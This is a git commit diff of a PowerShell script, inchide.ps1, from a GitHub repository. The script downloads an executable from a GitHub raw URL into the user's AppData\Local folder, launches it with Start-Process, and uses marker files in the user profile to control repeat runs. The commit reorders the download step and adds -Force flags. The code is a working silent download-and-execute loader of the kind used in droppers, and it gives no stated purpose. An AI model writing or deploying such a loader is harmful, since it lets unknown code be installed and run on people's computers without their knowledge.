2ede8216407d1181b8c62aec09bd33febc729c9d
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-23 20:36:38 +0300

    Update inchide.ps1

--- Inchide/inchide.ps1
+++ Inchide/inchide.ps1
@@ -1,20 +1,20 @@
 $x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
-$y = "$env:USERPROFILE\AppData\Local\inchide.exe"
+$y = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Local\inchide.exe"
 
 if (Test-Path "$env:USERPROFILE\EXITR2.txt") {
     exit
 }
 
-New-Item -Path "$env:USERPROFILE\H123R2.txt" -ItemType "file"
+New-Item -Path "$env:USERPROFILE\H123R2.txt" -ItemType "file" -Force
+
+Invoke-WebRequest -Uri $x -OutFile $y
 
 if (Test-Path "$env:USERPROFILE\H360R2.txt") {
-    New-Item -Path "$env:USERPROFILE\EXITR2.txt" -ItemType "file"
+    New-Item -Path "$env:USERPROFILE\EXITR2.txt" -ItemType "file" -Force
     Start-Process $y
 }
 
 if (Test-Path "$env:USERPROFILE\H123R2.txt") {
-    New-Item -Path "$env:USERPROFILE\H360R2.txt" -ItemType "file"
+    New-Item -Path "$env:USERPROFILE\H360R2.txt" -ItemType "file" -Force
     Start-Process $y
 }
-
-Invoke-WebRequest -Uri $x -OutFile $y
